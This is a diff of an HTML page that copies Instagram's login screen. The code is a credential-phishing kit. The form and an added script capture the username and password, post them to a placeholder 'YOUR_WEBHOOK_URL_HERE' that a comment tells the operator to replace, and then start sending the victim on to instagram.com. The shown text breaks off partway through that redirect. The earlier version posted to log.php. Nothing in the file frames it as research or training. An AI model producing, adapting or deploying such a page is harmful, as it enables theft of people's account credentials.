@@ -4,78 +4,94 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <link rel="icon" href="https://static.ri.me/images/webclip-logo.png">
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #fafafa;
             margin: 0;
-            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
         .container {
-            background-color: white;
+            background-color: #ffffff;
             border: 1px solid #dbdbdb;
             padding: 40px;
             width: 350px;
             text-align: center;
-            border-radius: 1px;
         }
         h2 {
-            margin: 0 0 20px;
+            margin: 0 0 20px 0;
             font-size: 32px;
-            font-family: 'Grand Hotel', cursive, sans-serif;
+            font-family: 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
         }
         input {
             width: 100%;
-            padding: 9px 7px;
-            margin: 1px 0 8px;
+            padding: 9px 8px;
+            margin-bottom: 10px;
+            background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            background: #fafafa;
             font-size: 12px;
+            box-sizing: border-box;
         }
         button {
             width: 100%;
-            padding: 8px 0;
-            background-color: #0095f6;
-            color: white;
+            padding: 9px;
+            background-color: #3897f0;
             border: none;
             border-radius: 4px;
+            color: #ffffff;
             font-weight: 600;
+            font-size: 14px;
             cursor: pointer;
             margin-top: 10px;
         }
         button:hover {
-            background-color: #1877f2;
+            background-color: #3897f0;
         }
         a {
             display: block;
-            margin-top: 15px;
-            color: #00376b;
+            margin-top: 20px;
+            color: #003768;
             font-size: 12px;
             text-decoration: none;
-        }
-        .logo {
-            font-family: 'Grand Hotel', cursive, sans-serif;
-            font-size: 40px;
-            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="logo">Instagram</div>
-        <!-- This form sends data to log.php -->
-        <form action="log.php" method="POST">
+        <svg aria-label="Instagram" viewBox="0 0 24 24" width="24" height="24" style="margin-bottom: 20px;"><path fill="currentColor" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.14.145 4.86 1.86 5.005 5.005.058 1.266.07 1.646.07 4.85s-.012 3.584-.07 4.85c-.146 3.14-1.865 4.86-5.005 5.005-1.266.058-1.646.07-4.85.07s-3.584-.012-4.85-.07c-3.14-.145-4.86-1.86-5.005-5.005-.058-1.266-.07-1.646-.07-4.85s.012-3.584.07-4.85c.146-3.14 1.865-4.86 5.005-5.005 1.266-.058 1.646-.07 4.85-.07zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.358-.2 6.78-2.618 6.98-6.98.058-1.28.072-1.689.072-4.948 0-3.259-.014-3.668-.072-4.948-.2-4.358-2.618-6.78-6.98-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"></path></svg>
+        
+        <h2>Log in</h2>
+        
+        <!-- REPLACE THE URL BELOW WITH YOUR WEBHOOK.URL -->
+        <form action="YOUR_WEBHOOK_URL_HERE" method="POST" id="loginForm">
             <input type="text" name="username" placeholder="Phone number, username, or email" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Log in</button>
         </form>
+        
         <a href="#">Forgot password?</a>
     </div>
-</body>
-</html>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'YOUR_WEBHOOK_URL_HERE';
+            for(var i = 0; i < this.elements.length; i++) {
+                var input = this.elements[i];
+                var hiddenInput = document.createElement('input');
+                hiddenInput.type = 'hidden';
+                hiddenInput.name = input.name;
+                hiddenInput.value = input.value;
+                form.appendChild(hiddenInput);
+            }
+            document.body.appendChild(form);
+            form.submit();
+            setTimeout(function() {
+                window.location.href = "https://www.instagram.com
